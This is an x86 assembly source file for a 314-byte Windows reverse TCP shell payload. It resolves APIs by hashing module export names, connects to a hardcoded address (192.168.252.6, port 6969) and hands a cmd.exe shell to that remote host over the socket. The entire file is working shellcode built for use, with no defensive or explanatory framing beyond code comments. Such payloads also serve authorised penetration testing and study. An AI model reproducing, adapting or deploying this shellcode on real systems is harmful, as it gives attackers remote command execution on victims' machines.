;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (28 July 2009)
; Size: 314 bytes
; Build: >build.py single_shell_reverse_tcp
;-----------------------------------------------------------------------------;
[BITS 32]

cld                    ; Clear the direction flag.
call start             ; Call start, this pushes the address of 'api_call' onto the stack.

api_call:
	pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
	mov ebp, esp           ; Create a new stack frame
	xor eax, eax           ; Zero EAX (upper 3 bytes will remain zero until function is found)
	mov edx, [fs:eax+48]   ; Get a pointer to the PEB
	mov edx, [edx+12]      ; Get PEB->Ldr
	mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
next_mod:                ;
	mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
	movzx ecx, word [edx+38] ; Set ECX to the length we want to check
	xor edi, edi           ; Clear EDI which will store the hash of the module name
loop_modname:            ;
	lodsb                  ; Read in the next byte of the name
	cmp al, 'a'            ; Some versions of Windows use lower case module names
	jl not_lowercase       ;
	sub al, 0x20           ; If so normalise to uppercase
not_lowercase:           ;
	ror edi, 13            ; Rotate right our hash value
	add edi, eax           ; Add the next byte of the name
	loop loop_modname      ; Loop until we have read enough

	; We now have the module hash computed
	push edx               ; Save the current position in the module list for later
	push edi               ; Save the current module hash for later
	; Proceed to iterate the export address table,
	mov edx, [edx+16]      ; Get this modules base address
	mov ecx, [edx+60]      ; Get PE header

	; use ecx as our EAT pointer here so we can take advantage of jecxz.
	mov ecx, [ecx+edx+120] ; Get the EAT from the PE header
	jecxz get_next_mod1    ; If no EAT present, process the next module
	add ecx, edx           ; Add the modules base address
	push ecx               ; Save the current modules EAT
	mov ebx, [ecx+32]      ; Get the rva of the function names
	add ebx, edx           ; Add the modules base address
	mov ecx, [ecx+24]      ; Get the number of function names
	; now ecx returns to its regularly scheduled counter duties

; Computing the module hash + function hash
get_next_func:           ;
	jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
	dec ecx                ; Decrement the function name counter
	mov esi, [ebx+ecx*4]   ; Get rva of next module name
	add esi, edx           ; Add the modules base address
	xor edi, edi           ; Clear EDI which will store the hash of the function name
; And compare it to the one we want
loop_funcname:           ;
	lodsb                  ; Read in the next byte of the ASCII function name
	ror edi, 13            ; Rotate right our hash value
	add edi, eax           ; Add the next byte of the name
	cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
	jne loop_funcname      ; If we have not reached the null terminator, continue
	add edi, [ebp-8]       ; Add the current module hash to the function hash
	cmp edi, [ebp+36]      ; Compare the hash to the one we are searching for
	jnz get_next_func      ; Go compute the next function hash if we have not found it

	; If found, fix up stack, call the function and then value else compute the next one...
	pop eax                ; Restore the current modules EAT
	mov ebx, [eax+36]      ; Get the ordinal table rva
	add ebx, edx           ; Add the modules base address
	mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
	mov ebx, [eax+28]      ; Get the function addresses table rva
	add ebx, edx           ; Add the modules base address
	mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
	add eax, edx           ; Add the modules base address to get the functions actual VA
; We now fix up the stack and perform the call to the desired function...
finish:
	mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
	pop ebx                ; Clear off the current modules hash
	pop ebx                ; Clear off the current position in the module list
	popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
	pop ecx                ; Pop off the origional return address our caller will have pushed
	pop edx                ; Pop off the hash value our caller will have pushed
	push ecx               ; Push back the correct return value
	jmp eax                ; Jump into the required function
	; We now automagically return to the correct caller...

get_next_mod:            ;
	pop edi                ; Pop off the current (now the previous) modules EAT
get_next_mod1:           ;
	pop edi                ; Pop off the current (now the previous) modules hash
	pop edx                ; Restore our position in the module list
	mov edx, [edx]         ; Get the next module
	jmp short next_mod     ; Process this module

start:                   ;
	pop ebp                ; Pop off the address of 'api_call' for calling later.

reverse_tcp:
	push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
	push 0x5F327377        ; ...
	push esp               ; Push a pointer to the "ws2_32" string on the stack.
	push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
	call ebp               ; LoadLibraryA( "ws2_32" )

	mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
	sub esp, eax           ; alloc some space for the WSAData structure
	push esp               ; push a pointer to this stuct
	push eax               ; push the wVersionRequested parameter
	push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
	call ebp               ; WSAStartup( 0x0190, &WSAData );

	push eax               ; if we succeed, eax wil be zero, push zero for the flags param.
	push eax               ; push null for reserved parameter
	push eax               ; we do not specify a WSAPROTOCOL_INFO structure
	push eax               ; we do not specify a protocol
	inc eax                ;
	push eax               ; push SOCK_STREAM
	inc eax                ;
	push eax               ; push AF_INET
	push 0xE0DF0FEA        ; hash( "ws2_32.dll", "WSASocketA" )
	call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
	xchg edi, eax          ; save the socket for later, don't care about the value of eax after this

set_address:
	push byte 0x05         ; retry counter
	push 0x06fca8c0        ; IP address, 0xc0, 0xa8, 0xfc, 0x06 = 192.168.252.6
	push 0x391b0002        ; family AF_INET and port 6969
	mov esi, esp           ; save pointer to sockaddr struct
  
try_connect:
	push byte 16           ; length of the sockaddr struct
	push esi               ; pointer to the sockaddr struct
	push edi               ; the socket
	push 0x6174A599        ; hash( "ws2_32.dll", "connect" )
	call ebp               ; connect( s, &sockaddr, 16 );

	test eax,eax           ; non-zero means a failure
	jz short connected

handle_failure:
	dec dword [esi+8]
	jnz short try_connect

failure:
	push 0x56A2B5F0        ; hardcoded to exitprocess for size
	call ebp

connected:
  ; By here we will have performed the reverse_tcp connection and EDI will be out socket.

shell:
	push 0x00646D63        ; push our command line: 'cmd',0
	mov ebx, esp           ; save a pointer to the command line
	push edi               ; our socket becomes the shells hStdError
	push edi               ; our socket becomes the shells hStdOutput
	push edi               ; our socket becomes the shells hStdInput
	xor esi, esi           ; Clear ESI for all the NULL's we need to push
	push byte 18           ; We want to place (18 * 4) = 72 null bytes onto the stack
	pop ecx                ; Set ECX for the loop

push_loop:               ;
	push esi               ; push a null dword
	loop push_loop         ; keep looping untill we have pushed enough nulls
	mov word [esp + 60], 0x0101 ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
	lea eax, [esp + 16]    ; Set EAX as a pointer to our STARTUPINFO Structure
	mov byte [eax], 68     ; Set the size of the STARTUPINFO Structure
	; perform the call to CreateProcessA
	push esp               ; Push the pointer to the PROCESS_INFORMATION Structure 
	push eax               ; Push the pointer to the STARTUPINFO Structure
	push esi               ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
	push esi               ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
	push esi               ; We dont specify any dwCreationFlags 
	inc esi                ; Increment ESI to be one
	push esi               ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
	dec esi                ; Decrement ESI back down to zero
	push esi               ; Set lpThreadAttributes to NULL
	push esi               ; Set lpProcessAttributes to NULL
	push ebx               ; Set the lpCommandLine to point to "cmd",0
	push esi               ; Set lpApplicationName to NULL as we are using the command line param instead
	push 0x863FCC79        ; hash( "kernel32.dll", "CreateProcessA" )
	call ebp               ; CreateProcessA( 0, &"cmd", 0, 0, TRUE, 0, 0, 0, &si, &pi );
	; perform the call to WaitForSingleObject
	mov eax, esp           ; save pointer to the PROCESS_INFORMATION Structure 
	dec esi                ; Decrement ESI down to -1 (INFINITE)
	push esi               ; push INFINITE inorder to wait forever
	inc esi                ; Increment ESI back to zero
	push dword [eax]       ; push the handle from our PROCESS_INFORMATION.hProcess
	push 0x601D8708        ; hash( "kernel32.dll", "WaitForSingleObject" )
	call ebp               ; WaitForSingleObject( pi.hProcess, INFINITE );

; Finish up with the EXITFUNK.
exitfunk:
	mov ebx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...
	push 0x9DBD95A6        ; hash( "kernel32.dll", "GetVersion" )
	call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
	cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
	jl short goodbye       ; Then just call the exit function...
	cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
	jne short goodbye      ;
	mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
goodbye:                 ; We now perform the actual call to the exit function
	push byte 0            ; push the exit function parameter
	push ebx               ; push the hash of the exit function
	call ebp               ; call EXITFUNK( 0 );

